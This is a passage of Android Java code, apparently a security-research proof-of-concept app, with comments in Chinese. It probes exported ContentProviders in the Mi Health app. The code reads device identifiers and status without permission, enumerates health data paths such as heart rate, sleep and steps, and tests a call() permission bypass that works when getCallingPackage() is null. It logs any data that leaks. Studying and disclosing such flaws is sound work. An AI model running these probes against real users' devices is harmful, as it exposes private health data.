                    logLine("  >>> 设备唯一标识(DID)已泄露: " + did);
                }
            } else {
                logLine("  DeviceInfo = null (设备未连接)");
            }
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    // ==================== ContentProvider 验证 ====================

    /**
     * 攻击面 2: DeviceProvider
     * content://com.mi.health.provider.device/status
     * Manifest exported=true 无权限; 代码 query() 无任何权限检查 (DeviceProvider.java:160-171)
     * 预期: 任何应用可直接读取设备名/电量/型号/图标
     */
    private void testDeviceProvider() {
        logLine("===== [CP] DeviceProvider: content://.../device/status =====");
        try {
            Cursor cursor = getContentResolver().query(
                    URI_DEVICE_STATUS, null, null, null, null);
            if (cursor != null) {
                logLine("  query 成功! 无 SecurityException!");
                logLine("  行数: " + cursor.getCount());
                if (cursor.moveToFirst()) {
                    int colCount = cursor.getColumnCount();
                    for (int i = 0; i < colCount; i++) {
                        String colName = cursor.getColumnName(i);
                        String val = cursor.getString(i);
                        logLine("  " + colName + " = " + val);
                    }
                    logLine("  >>> 设备信息已通过 ContentProvider 泄露 (无权限)");
                } else {
                    logLine("  Cursor 为空 (可能未登录或设备未连接)");
                }
                cursor.close();
            } else {
                logLine("  Cursor = null (可能未登录或设备未连接)");
                logLine("  但 query 调用本身未被拒绝 (无 SecurityException)");
            }
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  异常: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        logLine("");
    }

    /**
     * 攻击面 3: DataContentProvider query
     * content://com.mi.health.provider.main/{path}
     * Manifest exported=true 无权限; 代码级 isPrivilegedPackage 鉴权
     * 非特权调用者 -> checkNormalPermission -> readPermission="" -> SecurityException
     * 预期: 全部 SecurityException (除非 isPrivilegedPackage 通过)
     */
    private void testDataContentProviderQuery() {
        logLine("===== [CP] DataContentProvider query 全路径 =====");
        logLine("  预期: 非特权应用应全部 SecurityException");
        logLine("");

        for (String[] entry : DC_QUERY_PATHS) {
            String path = entry[0];
            String desc = entry[1];
            Uri uri = Uri.withAppendedPath(URI_DC_BASE, path);
            try {
                Cursor cursor = getContentResolver().query(uri, null, null, null, null);
                if (cursor != null) {
                    logLine("  [成功] " + path + " (" + desc + ")");
                    logLine("    行数: " + cursor.getCount());
                    if (cursor.moveToFirst()) {
                        StringBuilder sb = new StringBuilder("    ");
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (i > 0) sb.append(", ");
                            sb.append(cursor.getColumnName(i))
                              .append("=").append(cursor.getString(i));
                        }
                        logLine(sb.toString());
                    }
                    cursor.close();
                } else {
                    logLine("  [null] " + path + " (" + desc + ") — Cursor=null 但无异常");
                }
            } catch (SecurityException e) {
                logLine("  [拒绝] " + path + " (" + desc + ") — SecurityException");
            } catch (Exception e) {
                logLine("  [异常] " + path + " (" + desc + ") — "
                        + e.getClass().getSimpleName() + ": " + e.getMessage());
            }
        }
        logLine("");
    }

    /**
     * 攻击面 3 绕过: DataContentProvider call()
     * DataContentProvider.call() 第 176-179 行:
     *   String callingPackage = getCallingPackage();
     *   if (callingPackage != null) { checkReadPermission(...); }
     * 当 getCallingPackage()=null 时跳过权限检查
     *
     * 测试两种调用方式:
     * 1. getContentResolver().call(uri, method, arg, extras) — 正常调用
     * 2. ContentProviderClient.call(method, arg, extras) — 尝试不同路径
     */
    private void testCallBypass() {
        logLine("===== [CP] call() 绕过验证 =====");
        logLine("  目标: getCallingPackage()=null 时跳过权限检查");
        logLine("");

        // 方式 1: 标准 ContentResolver.call(uri, method, arg, extras)
        logLine("--- 方式 1: ContentResolver.call() ---");
        for (String[] entry : DC_CALL_METHODS) {
            String methodUri = entry[0];
            String desc = entry[1];
            try {
                Bundle result = getContentResolver().call(
                        URI_DC_BASE, methodUri, null, null);
                if (result != null) {
                    logLine("  [成功] " + desc);
                    logBundle(result, "    ");
                } else {
                    logLine("  [null] " + desc + " — 返回 null 但无异常");
                }
            } catch (SecurityException e) {
                logLine("  [拒绝] " + desc + " — SecurityException");
            } catch (IllegalArgumentException e) {
                logLine("  [参数错误] " + desc + " — " + e.getMessage());
            } catch (Exception e) {
                logLine("  [异常] " + desc + " — "
                        + e.getClass().getSimpleName() + ": " + e.getMessage());
            }
        }
        logLine("");

        // 方式 2: ContentProviderClient
        logLine("--- 方式 2: ContentProviderClient.call() ---");
        try {
            ContentProviderClient client = getContentResolver()
                    .acquireUnstableContentProviderClient(URI_DC_BASE);
            if (client != null) {
                logLine("  获取 ContentProviderClient 成功");
                for (String[] entry : DC_CALL_METHODS) {
                    String methodUri = entry[0];
                    String desc = entry[1];
                    try {
                        Bundle result = client.call(methodUri, null, null);
                        if (result != null) {
                            logLine("  [成功] " + desc);
                            logBundle(result, "    ");
                        } else {
                            logLine("  [null] " + desc + " — 返回 null 但无异常");
                        }
                    } catch (SecurityException e) {
                        logLine("  [拒绝] " + desc + " — SecurityException");
                    } catch (Exception e) {
                        logLine("  [异常] " + desc + " — "
                                + e.getClass().getSimpleName() + ": " + e.getMessage());
                    }
                }
                client.close();
            } else {
                logLine("  ContentProviderClient = null");
            }
        } catch (SecurityException e) {
            logLine("  获取 client SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  获取 client 异常: "
                    + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        logLine("");
    }

    /**
     * 全量 call() 测试 + query 对比
     * 同时测试 query 和 call()，对比两种方式的权限检查差异
     */
    private void testCallAll() {
        logLine("===== [CP] query vs call() 对比测试 =====");

        String[][] testCases = {
            // {path, callMethodUri, description}
            {"account/isLogin",
             "content://com.mi.health.provider.main/account/isLogin#isLogin",
             "登录状态"},
            {"privacy",
             "content://com.mi.health.provider.main/privacy#isPrivacyAgree",
             "隐私协议"},
            {"privacy",
             "content://com.mi.health.provider.main/privacy#getRegion",
             "地区"},
            {"heartrate/recent",
             null,
             "最新心率 (仅 query, 无 call method)"},
            {"sleep/record",
             null,
             "睡眠记录 (仅 query)"},
            {"activity/steps/brief",
             null,
             "步数 (仅 query)"},
        };

        for (String[] tc : testCases) {
            String path = tc[0];
            String callUri = tc[1];
            String desc = tc[2];
            Uri queryUri = Uri.withAppendedPath(URI_DC_BASE, path);

            logLine("--- " + desc + " (" + path + ") ---");

            // query
            try {
                Cursor cursor = getContentResolver().query(queryUri, null, null, null, null);
                if (cursor != null) {
                    logLine("  query: [成功] 行数=" + cursor.getCount());
                    if (cursor.moveToFirst()) {
                        StringBuilder sb = new StringBuilder("    ");
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (i > 0) sb.append(", ");
                            sb.append(cursor.getColumnName(i)).append("=").append(cursor.getString(i));
                        }
                        logLine(sb.toString());
                    }
                    cursor.close();
                } else {
                    logLine("  query: [null] Cursor=null 无异常");
                }
            } catch (SecurityException e) {
                logLine("  query: [拒绝] SecurityException");
            } catch (Exception e) {
                logLine("  query: [异常] " + e.getClass().getSimpleName());
            }

            // call
            if (callUri != null) {
                try {
                    Bundle result = getContentResolver().call(URI_DC_BASE, callUri, null, null);
                    if (result != null) {
                        logLine("  call:  [成功] 数据已返回!");
                        logBundle(result, "    ");
                    } else {
                        logLine("  call:  [null] 返回 null 无异常");
                    }
                } catch (SecurityException e) {
                    logLine("  call:  [拒绝] SecurityException");
                } catch (Exception e) {
                    logLine("  call:  [异常] " + e.getClass().getSimpleName() + ": " + e.getMessage());
                }
            }
            logLine("");
        }
    }

    /** 打印 Bundle 内容 */
    private void logBundle(Bundle bundle, String indent) {
        for (String key : bundle.keySet()) {
            Object val = bundle.get(key);
            String valStr = (val instanceof String) ? (String) val : String.valueOf(val);
            if (valStr != null && valStr.length() > 200) {
                valStr = valStr.substring(0, 200) + "...(truncated)";
            }
            logLine(indent + key + " = " + valStr);
        }
    }

    // ==================== UI 辅助 ====================

    private void confirmAndRun(String title, String message, Runnable action) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("确认执行", (d, w) -> action.run())
                .setNegativeButton("取消", null)
                .show();
    }

    private void printSelfIdentity() {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(getPackageName(), 0);
            int uid = info.uid;
            boolean isSystem = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            logLine("===== 测试应用身份 =====");
            logLine("包名: " + getPackageName());
            logLine("UID: " + uid);
            logLine("是否系统应用: " + isSystem);
            logLine("签名: debug 签名 (非小米签名)");
            logLine("");
        } catch (Exception e) {
            logLine("获取自身信息失败: " + e.getMessage());
        }
    }

    private void printTargetIdentity() {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(TARGET_PKG, 0);
            int uid = info.uid;
            logLine("===== 目标应用身份 =====");
            logLine("包名: " + TARGET_PKG);
            logLine("UID: " + uid);
            logLine("");
        } catch (Exception e) {
            logLine("获取目标应用信息失败: " + e.getMessage());
            logLine("");
        }
    }

    private void logLine(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> {
            logView.append(msg);
            logView.append("\n");
        });
    }
}
